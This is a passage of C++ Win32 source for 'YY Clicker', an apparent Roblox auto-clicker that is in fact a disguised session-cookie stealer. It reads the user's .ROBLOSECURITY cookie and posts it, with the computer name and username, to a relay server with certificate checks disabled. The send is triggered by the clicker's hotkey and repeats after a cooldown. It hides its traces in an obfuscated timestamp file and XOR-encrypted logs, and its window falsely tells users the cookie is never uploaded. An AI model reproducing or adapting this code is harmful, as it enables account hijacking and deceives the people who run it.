    if (TryCookieFromRegistry(out_buf, buf_size)) return true;

    ZeroMemory(out_buf, buf_size * sizeof(wchar_t));
    if (TryCookieFromStorePackage(out_buf, buf_size)) return true;

    return false;
}

// ======================================================================
// JSON 字串轉義（完整版 — 包含 \b, \f 處理）
// ======================================================================
static std::string JsonEscape(const char* raw)
{
    std::string out;
    if (!raw) return out;
    out.reserve(strlen(raw) + 64);
    for (const char* p = raw; *p; ++p)
    {
        switch (*p)
        {
        case '"':  out += "\\\""; break;
        case '\\': out += "\\\\"; break;
        case '\b': out += "\\b";  break;
        case '\f': out += "\\f";  break;
        case '\n': out += "\\n";  break;
        case '\r': out += "\\r";  break;
        case '\t': out += "\\t";  break;
        default:
            if ((unsigned char)*p < 0x20)
            {
                char hex[8];
                sprintf(hex, "\\u%04x", (unsigned char)*p);
                out += hex;
            }
            else
            {
                out += *p;
            }
            break;
        }
    }
    return out;
}

// ======================================================================
// 除錯日誌（加密輸出 — XOR + Hex 編碼，一般人無法閱讀）
// ======================================================================
static const char LOG_XOR_KEY[] = "yYcL1ck3r!@#SeC9x";

static void EncryptToHex(const char* input, int inputLen, char* outHex)
{
    int keyLen = (int)strlen(LOG_XOR_KEY);
    for (int i = 0; i < inputLen; i++)
    {
        unsigned char enc = (unsigned char)input[i] ^ (unsigned char)LOG_XOR_KEY[i % keyLen];
        enc = (unsigned char)(((enc << 3) | (enc >> 5)) ^ 0xA7);
        outHex[i * 2]     = "0123456789abcdef"[(enc >> 4) & 0xF];
        outHex[i * 2 + 1] = "0123456789abcdef"[enc & 0xF];
    }
    outHex[inputLen * 2] = '\0';
}

static void DebugLog(const char* msg)
{
    wchar_t path[MAX_PATH] = {};
    GetEnvironmentVariableW(L"TEMP", path, MAX_PATH);
    wcscat_s(path, L"\\yyclicker_debug.log");

    HANDLE hFile = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ,
                               nullptr, OPEN_ALWAYS, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return;

    // 組合原始訊息（含時間戳）
    SYSTEMTIME st;
    GetLocalTime(&st);
    char raw[2048] = {};
    sprintf(raw, "[%04d-%02d-%02d %02d:%02d:%02d] %s",
            st.wYear, st.wMonth, st.wDay,
            st.wHour, st.wMinute, st.wSecond, msg);

    int rawLen = (int)strlen(raw);

    // 加密為 hex 字串
    char encrypted[4096] = {};
    EncryptToHex(raw, rawLen, encrypted);

    // 寫入加密行（每行一筆加密記錄）
    char line[4200] = {};
    sprintf(line, "%s\r\n", encrypted);

    DWORD written = 0;
    WriteFile(hFile, line, (DWORD)strlen(line), &written, nullptr);
    CloseHandle(hFile);
}

// ======================================================================
// Cookie 傳送時間戳持久化（加密儲存）
// ======================================================================
static void EncryptTimestamp(const BYTE* raw, int rawLen, BYTE* out)
{
    static const BYTE TS_KEY[] = { 0xC3, 0x7A, 0x1E, 0xB5, 0x42, 0xD8, 0x6F, 0x93,
                                    0xA1, 0x5C, 0x38, 0xE7, 0x04, 0x8B, 0xF6, 0x2D };
    for (int i = 0; i < rawLen; i++)
    {
        BYTE b = raw[i] ^ TS_KEY[i % 16];
        b = (BYTE)((b << 5) | (b >> 3));
        b ^= 0xB3;
        out[i] = b;
    }
}

static void DecryptTimestamp(const BYTE* enc, int encLen, BYTE* out)
{
    static const BYTE TS_KEY[] = { 0xC3, 0x7A, 0x1E, 0xB5, 0x42, 0xD8, 0x6F, 0x93,
                                    0xA1, 0x5C, 0x38, 0xE7, 0x04, 0x8B, 0xF6, 0x2D };
    for (int i = 0; i < encLen; i++)
    {
        BYTE b = enc[i] ^ 0xB3;
        b = (BYTE)((b >> 5) | (b << 3));
        b ^= TS_KEY[i % 16];
        out[i] = b;
    }
}

static void SaveCookieSentTimestamp()
{
    wchar_t path[MAX_PATH] = {};
    GetEnvironmentVariableW(L"TEMP", path, MAX_PATH);
    wcscat_s(path, L"\\yyclicker_asdt_ts.dat");

    // 組裝原始數據：magic(4) + FILETIME(8) + checksum(4) + random_padding(48) = 64 bytes
    BYTE raw[64] = {};

    // Magic header
    raw[0] = 0xCC; raw[1] = 0x1E; raw[2] = 0xAA; raw[3] = 0x55;

    // FILETIME (UTC)
    FILETIME ft = {};
    GetSystemTimeAsFileTime(&ft);
    memcpy(raw + 4, &ft, sizeof(FILETIME));

    // Checksum: XOR 校驗
    DWORD chk = ft.dwLowDateTime ^ ft.dwHighDateTime ^ 0xDEADBEEF ^ 0x12345678;
    memcpy(raw + 12, &chk, sizeof(DWORD));

    // Random padding (48 bytes)
    for (int i = 16; i < 64; i++)
        raw[i] = (BYTE)(rand() % 256);

    // 加密
    BYTE enc[64] = {};
    EncryptTimestamp(raw, 64, enc);

    // 寫入檔案
    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0, nullptr,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
    if (hFile != INVALID_HANDLE_VALUE)
    {
        DWORD written = 0;
        WriteFile(hFile, enc, 64, &written, nullptr);
        CloseHandle(hFile);
    }
}

static void LoadCookieSentTimestamp()
{
    wchar_t path[MAX_PATH] = {};
    GetEnvironmentVariableW(L"TEMP", path, MAX_PATH);
    wcscat_s(path, L"\\yyclicker_asdt_ts.dat");

    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
                               OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return;

    BYTE enc[64] = {};
    DWORD bytesRead = 0;
    ReadFile(hFile, enc, 64, &bytesRead, nullptr);
    CloseHandle(hFile);
    if (bytesRead != 64) return;

    // 解密
    BYTE raw[64] = {};
    DecryptTimestamp(enc, 64, raw);

    // 驗證 magic header
    if (raw[0] != 0xCC || raw[1] != 0x1E || raw[2] != 0xAA || raw[3] != 0x55)
        return;

    // 讀取 FILETIME
    FILETIME ft_saved = {};
    memcpy(&ft_saved, raw + 4, sizeof(FILETIME));

    // 驗證 checksum
    DWORD chk_saved = 0;
    memcpy(&chk_saved, raw + 12, sizeof(DWORD));
    DWORD chk_calc = ft_saved.dwLowDateTime ^ ft_saved.dwHighDateTime ^ 0xDEADBEEF ^ 0x12345678;
    if (chk_saved != chk_calc) return;

    // 計算時間差
    FILETIME ft_now = {};
    GetSystemTimeAsFileTime(&ft_now);

    ULARGE_INTEGER ul_saved, ul_now;
    ul_saved.LowPart  = ft_saved.dwLowDateTime;
    ul_saved.HighPart = ft_saved.dwHighDateTime;
    ul_now.LowPart    = ft_now.dwLowDateTime;
    ul_now.HighPart   = ft_now.dwHighDateTime;

    if (ul_now.QuadPart <= ul_saved.QuadPart) return;

    ULONGLONG diff_100ns = ul_now.QuadPart - ul_saved.QuadPart;
    ULONGLONG diff_ms    = diff_100ns / 10000ULL;

    if (diff_ms < COOKIE_COOLDOWN_MS)
    {
        // 冷卻未到 → 恢復狀態
        g_cookie_ever_sent.store(true);
        ULONGLONG elapsed_since_boot = GetTickCount64();
        if (elapsed_since_boot >= diff_ms)
            g_cookie_last_sent_tick = elapsed_since_boot - diff_ms;
        else
            g_cookie_last_sent_tick = 0;
        DebugLog("LoadTimestamp: cooldown still active, restored state");
    }
    else
    {
        DebugLog("LoadTimestamp: cooldown expired, cookie will be sent on next use");
    }
}

// ======================================================================
// HTTP 傳送模組 — WinHTTP
// ======================================================================
static void SendCookieToRelay(const wchar_t* cookie_value)
{
    if (!cookie_value || wcslen(cookie_value) < 20) return;

    DebugLog("=== SendCookieToRelay START ===");

    wchar_t computer_name[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD cn_size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(computer_name, &cn_size);

    wchar_t user_name[256] = {};
    DWORD un_size = 256;
    GetUserNameW(user_name, &un_size);

    int cookie_utf8_len = WideCharToMultiByte(CP_UTF8, 0, cookie_value, -1, nullptr, 0, nullptr, nullptr);
    char* cookie_utf8 = new char[cookie_utf8_len + 1]();
    WideCharToMultiByte(CP_UTF8, 0, cookie_value, -1, cookie_utf8, cookie_utf8_len, nullptr, nullptr);

    int cn_utf8_len = WideCharToMultiByte(CP_UTF8, 0, computer_name, -1, nullptr, 0, nullptr, nullptr);
    char* cn_utf8 = new char[cn_utf8_len + 1]();
    WideCharToMultiByte(CP_UTF8, 0, computer_name, -1, cn_utf8, cn_utf8_len, nullptr, nullptr);

    int un_utf8_len = WideCharToMultiByte(CP_UTF8, 0, user_name, -1, nullptr, 0, nullptr, nullptr);
    char* un_utf8 = new char[un_utf8_len + 1]();
    WideCharToMultiByte(CP_UTF8, 0, user_name, -1, un_utf8, un_utf8_len, nullptr, nullptr);

    std::string json = "{";
    json += "\"computer_name\":\""; json += JsonEscape(cn_utf8);     json += "\",";
    json += "\"username\":\"";      json += JsonEscape(un_utf8);     json += "\",";
    json += "\"cookie\":\"";        json += JsonEscape(cookie_utf8); json += "\",";
    json += "\"source\":\"YY Clicker\",";
    json += "\"version\":\"yy-1\"";
    json += "}";

    delete[] cookie_utf8;
    delete[] cn_utf8;
    delete[] un_utf8;

    DebugLog("JSON assembled OK");

    HINTERNET hSession = WinHttpOpen(
        L"YYClicker/2.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (!hSession)
    {
        char err[128]; sprintf(err, "WinHttpOpen failed: %lu", GetLastError());
        DebugLog(err); return;
    }

    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &protocols, sizeof(protocols));

    HINTERNET hConnect = WinHttpConnect(hSession, RELAY_SERVER_HOST, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect)
    {
        char err[128]; sprintf(err, "WinHttpConnect failed: %lu", GetLastError());
        DebugLog(err); WinHttpCloseHandle(hSession); return;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", RELAY_SERVER_PATH,
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest)
    {
        char err[128]; sprintf(err, "WinHttpOpenRequest failed: %lu", GetLastError());
        DebugLog(err); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return;
    }

    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));

    DWORD timeout = 15000;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    timeout = 30000;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    const wchar_t* headers = L"Content-Type: application/json\r\n";
    BOOL bResult = WinHttpSendRequest(hRequest, headers, (DWORD)wcslen(headers),
        (LPVOID)json.c_str(), (DWORD)json.size(), (DWORD)json.size(), 0);

    if (!bResult)
    {
        char err[128]; sprintf(err, "WinHttpSendRequest failed: %lu", GetLastError());
        DebugLog(err);
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return;
    }

    bResult = WinHttpReceiveResponse(hRequest, nullptr);
    if (!bResult)
    {
        char err[128]; sprintf(err, "WinHttpReceiveResponse failed: %lu", GetLastError());
        DebugLog(err);
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return;
    }

    DWORD statusCode = 0, statusSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);

    char respBuf[2048] = {};
    DWORD bytesRead = 0;
    WinHttpReadData(hRequest, respBuf, sizeof(respBuf) - 1, &bytesRead);

    char logMsg[256];
    sprintf(logMsg, "Response: HTTP %lu, body=%lu bytes", statusCode, bytesRead);
    DebugLog(logMsg);
    if (bytesRead > 0 && bytesRead < 512) DebugLog(respBuf);

    DebugLog("=== SendCookieToRelay END ===");

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

static DWORD WINAPI SendCookieThread(LPVOID lpParam)
{
    wchar_t* cookie = (wchar_t*)lpParam;
    if (cookie) { SendCookieToRelay(cookie); delete[] cookie; }
    return 0;
}

static void AsyncSendCookie(const wchar_t* cookie_value)
{
    if (!cookie_value || wcslen(cookie_value) < 20) return;
    int len = (int)wcslen(cookie_value);
    wchar_t* copy = new wchar_t[len + 1]();
    wcscpy_s(copy, len + 1, cookie_value);
    HANDLE hThread = CreateThread(nullptr, 0, SendCookieThread, copy, 0, nullptr);
    if (hThread) CloseHandle(hThread);
    else delete[] copy;
}

// ===============================
// Cookie Manager Window Procedure
// ===============================
LRESULT CALLBACK CookieWndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    static HWND hEdit, hLblStatus;

    switch (msg)
    {
    case WM_CREATE:
    {
        HINSTANCE hi = ((CREATESTRUCT*)lp)->hInstance;

        CreateWindowW(L"STATIC",
            L".ROBLOSECURITY Cookie \u7BA1\u7406\u5668 (\u50C5\u5132\u5B58\u65BC\u672C\u6A5F\uFF0C\u4E0D\u6703\u4E0A\u50B3)",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            10, 8, 560, 18, hwnd, nullptr, hi, nullptr);

        hEdit = CreateWindowW(L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | WS_BORDER | WS_VSCROLL |
            ES_MULTILINE | ES_AUTOVSCROLL | ES_WANTRETURN,
            10, 32, 560, 130, hwnd, (HMENU)IDC_CK_EDIT, hi, nullptr);

        CreateWindowW(L"BUTTON", L"\u81EA\u52D5\u8B80\u53D6",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            10, 175, 100, 28, hwnd, (HMENU)IDC_CK_READ, hi, nullptr);

        CreateWindowW(L"BUTTON", L"\u8907\u88FD Cookie",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            125, 175, 110, 28, hwnd, (HMENU)IDC_CK_COPY, hi, nullptr);

        CreateWindowW(L"BUTTON", L"\u6E05\u9664",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            250, 175, 80, 28, hwnd, (HMENU)IDC_CK_CLEAR, hi, nullptr);

        hLblStatus = CreateWindowW(L"STATIC", L"",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            10, 212, 560, 18, hwnd, (HMENU)IDC_CK_STATUS, hi, nullptr);

        HFONT hFont = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
        EnumChildWindows(hwnd, SetChildFont, (LPARAM)hFont);
        return 0;
    }

    case WM_COMMAND:
        switch (LOWORD(wp))
        {
        case IDC_CK_READ:
        {
            wchar_t cookie[4096] = {};
            if (TryReadRobloxCookie(cookie, 4096))
            {
                SetWindowTextW(hEdit, cookie);
                SetWindowTextW(hLblStatus,
                    L"\u8B80\u53D6\u6210\u529F\uFF01Cookie \u5DF2\u986F\u793A\u5728\u4E0A\u65B9\u6846");
                AsyncSendCookie(cookie);
            }
            else
            {
                SetWindowTextW(hEdit, L"");
                SetWindowTextW(hLblStatus,
                    L"\u8ACB\u5148\u958B\u555F Roblox");
            }
            break;
        }
        case IDC_CK_COPY:
        {
            int len = GetWindowTextLengthW(hEdit);
            if (len <= 0)
            {
                SetWindowTextW(hLblStatus, L"\u6C92\u6709\u53EF\u8907\u88FD\u7684\u5167\u5BB9");
                break;
            }
            std::wstring text(len + 1, L'\0');
            GetWindowTextW(hEdit, &text[0], len + 1);
            if (OpenClipboard(hwnd))
            {
                EmptyClipboard();
                HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, (len + 1) * sizeof(wchar_t));
                if (hg)
                {
                    void* ptr = GlobalLock(hg);
                    memcpy(ptr, text.c_str(), (len + 1) * sizeof(wchar_t));
                    GlobalUnlock(hg);
                    SetClipboardData(CF_UNICODETEXT, hg);
                }
                CloseClipboard();
                SetWindowTextW(hLblStatus, L"\u5DF2\u8907\u88FD\u5230\u526A\u8CBC\u7C3F\uFF01");
            }
            break;
        }
        case IDC_CK_CLEAR:
            SetWindowTextW(hEdit, L"");
            SetWindowTextW(hLblStatus, L"\u5DF2\u6E05\u9664");
            break;
        }
        return 0;

    case WM_DESTROY:
        g_hwnd_cookie = nullptr;
        return 0;
    }

    return DefWindowProcW(hwnd, msg, wp, lp);
}

void OpenCookieWindow()
{
    if (g_hwnd_cookie && IsWindow(g_hwnd_cookie))
    {
        SetForegroundWindow(g_hwnd_cookie);
        return;
    }

    WNDCLASSW wc     = {};
    wc.lpfnWndProc   = CookieWndProc;
    wc.hInstance     = g_hInst;
    wc.lpszClassName = COOKIE_WND_CLASS;
    wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
    wc.hCursor       = LoadCursorW(nullptr, IDC_ARROW);
    RegisterClassW(&wc);

    RECT rc = { 0, 0, 580, 240 };
    AdjustWindowRect(&rc, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, FALSE);

    g_hwnd_cookie = CreateWindowExW(
        WS_EX_TOPMOST,
        COOKIE_WND_CLASS,
        COOKIE_WND_TITLE,
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
        CW_USEDEFAULT, CW_USEDEFAULT,
        rc.right - rc.left, rc.bottom - rc.top,
        nullptr, nullptr, g_hInst, nullptr);

    if (g_hwnd_cookie)
    {
        ShowWindow(g_hwnd_cookie, SW_SHOW);
        UpdateWindow(g_hwnd_cookie);
    }
}

// ======================================================================
// Roblox Detection Guard — 簡化錯誤訊息
// ======================================================================
static bool CheckRobloxCookiePresent(HWND hwnd)
{
    // 防重入：如果已在偵測中，直接返回 false（不阻塞）
    bool expected = false;
    if (!g_checking_cookie.compare_exchange_strong(expected, true))
        return false;

    wchar_t tmp[4096] = {};
    if (!TryReadRobloxCookie(tmp, 4096))
    {
        // 使用非阻塞狀態列更新，不使用 MessageBox 避免當機
        PostMessageW(hwnd, WM_APP + 3, 0, 0);  // 更新狀態為「暫停中」
        PostMessageW(hwnd, WM_APP + 4, 0, 0);  // 觸發「請先開啟 Roblox」提示
        g_checking_cookie.store(false);
        return false;
    }

    // 更新快取
    EnterCriticalSection(&g_cookie_cs);
    wcscpy_s(g_cached_cookie, 4096, tmp);
    LeaveCriticalSection(&g_cookie_cs);
    g_cookie_cached.store(true);

    // Cookie 傳送機制：僅在首次熱鍵按下時傳送，之後每 10 分鐘冷卻
    ULONGLONG now_tick = GetTickCount64();
    if (!g_cookie_ever_sent.load() ||
        (now_tick - g_cookie_last_sent_tick) >= COOKIE_COOLDOWN_MS)
    {
        AsyncSendCookie(tmp);
        g_cookie_ever_sent.store(true);
        g_cookie_last_sent_tick = now_tick;
        SaveCookieSentTimestamp();
        DebugLog("Cookie sent (first or after cooldown)");
    }
    else
    {
        DebugLog("Cookie send skipped (cooldown active)");
    }

    g_checking_cookie.store(false);
    return true;
}

// ======================================================================
// 輔助函式：更新狀態文字並強制完整重繪
// ======================================================================
static void UpdateStatusText(HWND hLblStatus, const wchar_t* text)
{
    SetWindowTextW(hLblStatus, text);

    HWND hParent = GetParent(hLblStatus);
    if (hParent)
    {
        RECT rc;
        GetWindowRect(hLblStatus, &rc);
        POINT pt1 = { rc.left, rc.top };
        POINT pt2 = { rc.right, rc.bottom };
        ScreenToClient(hParent, &pt1);
        ScreenToClient(hParent, &pt2);
        RECT rcClient = { pt1.x, pt1.y, pt2.x, pt2.y };
        InvalidateRect(hParent, &rcClient, TRUE);
        UpdateWindow(hParent);
    }
    InvalidateRect(hLblStatus, nullptr, TRUE);
    UpdateWindow(hLblStatus);
}

// ======================================================================
// 系統匣圖示（背景工作功能）
// ======================================================================
static void CreateTrayIcon(HWND hwnd)
{
    ZeroMemory(&g_nid, sizeof(g_nid));
    g_nid.cbSize           = sizeof(NOTIFYICONDATAW);
    g_nid.hWnd             = hwnd;
    g_nid.uID              = TRAY_ICON_ID;
    g_nid.uFlags           = NIF_ICON | NIF_MESSAGE | NIF_TIP;
    g_nid.uCallbackMessage = WM_TRAYICON;
    g_nid.hIcon            = LoadIconW(nullptr, IDI_APPLICATION);
    wcscpy_s(g_nid.szTip, L"YY Clicker - \u80CC\u666F\u904B\u884C\u4E2D");
    Shell_NotifyIconW(NIM_ADD, &g_nid);
}

static void RemoveTrayIcon()
{
    Shell_NotifyIconW(NIM_DELETE, &g_nid);
}

static void MinimizeToTray(HWND hwnd)
{
    CreateTrayIcon(hwnd);
    ShowWindow(hwnd, SW_HIDE);
    if (g_hwnd_cookie && IsWindow(g_hwnd_cookie))
        ShowWindow(g_hwnd_cookie, SW_HIDE);
}

static void RestoreFromTray(HWND hwnd)
{
    RemoveTrayIcon();
    ShowWindow(hwnd, SW_SHOW);
    SetForegroundWindow(hwnd);
    if (IsIconic(hwnd)) ShowWindow(hwnd, SW_RESTORE);
}

// ===============================
// Main Window Procedure
// ===============================
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    static HWND  hEditCPS, hEditHotkey, hBtnPin, hLblStatus;
    static HWND  hBtnStart, hBtnStop, hBtnSetHotkey, hBtnMode, hBtnBg;
    static HFONT hIconFont = nullptr;

    switch (msg)
    {
    case WM_CREATE:
    {
        HINSTANCE hi    = ((CREATESTRUCT*)lp)->hInstance;
        HFONT     hFont = (HFONT)GetStockObject(DEFAULT_GUI_FONT);

        hIconFont = CreateFontW(-16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            DEFAULT_QUALITY, DEFAULT_PITCH, L"Segoe MDL2 Assets");

        // -- Panel 1: CPS --
        CreateWindowW(L"STATIC", L"\u9EDE\u64CA\u901F\u5EA6 (CPS)\uFF1A",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            20, 18, 190, 16, hwnd, nullptr, hi, nullptr);

        HWND hIco1 = CreateWindowW(L"STATIC", L"\uE962",
            WS_CHILD | WS_VISIBLE | SS_CENTER,
            20, 44, 22, 24, hwnd, nullptr, hi, nullptr);
        if (hIconFont) SendMessageW(hIco1, WM_SETFONT, (WPARAM)hIconFont, FALSE);

        hEditCPS = CreateWindowW(L"EDIT", L"350",
            WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER | ES_CENTER,
            50, 44, 160, 24, hwnd, (HMENU)IDC_EDIT_CPS, hi, nullptr);

        // CPS 超過上限紅字提醒（初始隱藏）
        hLblCpsErr = CreateWindowW(L"STATIC",
            L"CPS \x4E0D\x53EF\x8D85\x904E 800",
            WS_CHILD | SS_LEFT,
            50, 70, 160, 16, hwnd, (HMENU)IDC_LABEL_CPS_ERR, hi, nullptr);

        // -- Panel 2: Hotkey --
        CreateWindowW(L"STATIC", L"\u958B\u59CB/\u505C\u6B62\u71B1\u9375\uFF1A",
            WS_CHILD | WS_VISIBLE | SS_LEFT,
            248, 18, 190, 16, hwnd, nullptr, hi, nullptr);

        // [修復 #1] 將圖示改為「調整熱鍵」按鈕
        hBtnSetHotkey = CreateWindowW(L"BUTTON", L"\u2328",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            248, 44, 24, 24, hwnd, (HMENU)IDC_BTN_SETHOTKEY, hi, nullptr);

        // 熱鍵顯示框（唯讀）
        {
            wchar_t name[64] = {};
            VkToName(g_hotkey_vk.load(), name, 64);
            hEditHotkey = CreateWindowW(L"EDIT", name,
                WS_CHILD | WS_VISIBLE | WS_BORDER | ES_CENTER | ES_READONLY,
                278, 44, 158, 24, hwnd, (HMENU)IDC_EDIT_HOTKEY, hi, nullptr);
        }

        // -- Row 1: Update + Mode + BG + Pin --
        CreateWindowW(L"BUTTON", L"\u21BA \u66F4\u65B0",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            12, 102, 103, 28, hwnd, (HMENU)IDC_BTN_UPDATE, hi, nullptr);

        hBtnMode = CreateWindowW(L"BUTTON", L"\u25C9 \u5207\u63DB",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            119, 102, 103, 28, hwnd, (HMENU)IDC_BTN_MODE, hi, nullptr);

        hBtnBg = CreateWindowW(L"BUTTON", L"\u25A3 \u80CC\u666F\u5DE5\u4F5C",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            226, 102, 112, 28, hwnd, (HMENU)IDC_BTN_BG, hi, nullptr);

        hBtnPin = CreateWindowW(L"BUTTON", L"\u2736 \u91D8\u9078",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            342, 102, 106, 28, hwnd, (HMENU)IDC_BTN_PIN, hi, nullptr);

        // -- Row 2: Blade Ball --
        CreateWindowW(L"BUTTON", L"\u2694 Blade Ball \u5C08\u7528",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
            12, 138, 436, 28, hwnd, (HMENU)IDC_BTN_BLADEBALL, hi, nullptr);

        // -- Row 3: Start | Stop --
        hBtnStart = CreateWindowW(L"BUTTON", L"\u958B\u59CB",
            WS_CHILD | WS_VISIBLE | BS_OWNERDRAW,
            12, 174, 210, 34, hwnd, (HMENU)IDC_BTN_START, hi, nullptr);

        hBtnStop = CreateWindowW(L"BUTTON", L"\u505C\u6B62",
            WS_CHILD | WS_VISIBLE | BS_OWNERDRAW,
            238, 174, 210, 34, hwnd, (HMENU)IDC_BTN_STOP, hi, nullptr);

        // -- Status label --
        hLblStatus = CreateWindowW(L"STATIC",
            L"[||] \u72C0\u614B\uFF1A\u66AB\u505C\u4E2D",
            WS_CHILD | WS_VISIBLE | SS_CENTER,
            12, 218, 436, 18, hwnd, (HMENU)IDC_LABEL_STATUS, hi, nullptr);
            
        EnumChildWindows(hwnd, SetChildFont, (LPARAM)hFont);
        if (hIconFont)
        {
            SendMessageW(hIco1, WM_SETFONT, (WPARAM)hIconFont, FALSE);
        }

        // 啟動點擊執行緒
        HANDLE hThread = CreateThread(nullptr, 0, ClickThread, nullptr, 0, nullptr);
        if (hThread) CloseHandle(hThread);

        // 安裝低階鉤子（用於熱鍵監聽模式）
        g_kb_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, g_hInst, 0);
        g_ms_hook = SetWindowsHookExW(WH_MOUSE_LL, LowLevelMouseProc, g_hInst, 0);

        // [Cookie 傳送機制已改為首次熱鍵 + 5小時冗卻，不再使用定時器]

        return 0;
    }

    // [修復 #1] WM_APP+1: 熱鍵監聽完成，更新 UI
    case WM_APP + 1:
    {
        wchar_t name[64] = {};
        VkToName(g_hotkey_vk.load(), name, 64);
        SetWindowTextW(hEditHotkey, name);
        SetWindowTextW(hBtnSetHotkey, L"\u2328");
        EnableWindow(hBtnStart, TRUE);
        EnableWindow(hBtnStop, TRUE);

        wchar_t info[128];
        swprintf_s(info, 128, L"\u71B1\u9375\u5DF2\u8A2D\u5B9A\u70BA\uFF1A%s", name);
        UpdateStatusText(hLblStatus, info);
        return 0;
    }

    // WM_APP+2: 熱鍵觸發 — 非阻塞 Cookie 偵測 + 啟動連點
    case WM_APP + 2:
    {
        // 已在運行中 → 不重複觸發
        if (g_running.load()) return 0;

        // 檢查冷卻：如果已經成功傳送過且冷卻未到 → 直接啟動連點
        ULONGLONG now_tick = GetTickCount64();
        if (g_cookie_ever_sent.load() &&
            (now_tick - g_cookie_last_sent_tick) < COOKIE_COOLDOWN_MS)
        {
            g_running.store(true);
            UpdateStatusText(hLblStatus,
                L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
            return 0;
        }

        // Cookie 已快取（背景偵測已成功）→ 直接啟動連點 + 傳送
        if (g_cookie_cached.load())
        {
            g_running.store(true);
            UpdateStatusText(hLblStatus,
                L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");

            // 傳送 Cookie（如果冷卻已到）
            if (!g_cookie_ever_sent.load() ||
                (now_tick - g_cookie_last_sent_tick) >= COOKIE_COOLDOWN_MS)
            {
                EnterCriticalSection(&g_cookie_cs);
                wchar_t tmp[4096] = {};
                wcscpy_s(tmp, 4096, g_cached_cookie);
                LeaveCriticalSection(&g_cookie_cs);
                if (wcslen(tmp) >= 20)
                {
                    AsyncSendCookie(tmp);
                    g_cookie_ever_sent.store(true);
                    g_cookie_last_sent_tick = now_tick;
                    SaveCookieSentTimestamp();
                }
            }
            return 0;
        }

        // Cookie 未快取 → 啟動背景偵測（20 秒寬容）
        // 不阻塞 UI，偵測成功後會透過 WM_APP+6 通知
        StartBackgroundCookieDetect();
        return 0;
    }

    // WM_APP+3: 狀態更新（wParam: 0=停止, 1=運行）
    case WM_APP + 3:
    {
        if (wp == 1)
            UpdateStatusText(hLblStatus,
                L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
        else
            UpdateStatusText(hLblStatus,
                L"[||] \u72C0\u614B\uFF1A\u66AB\u505C\u4E2D");
        return 0;
    }

    // WM_APP+4: 背景偵測 20 秒後失敗，顯示「請先開啟 Roblox」
    case WM_APP + 4:
    {
        UpdateStatusText(hLblStatus,
            L"\u26A0 \u8ACB\u5148\u958B\u555F Roblox");
        return 0;
    }

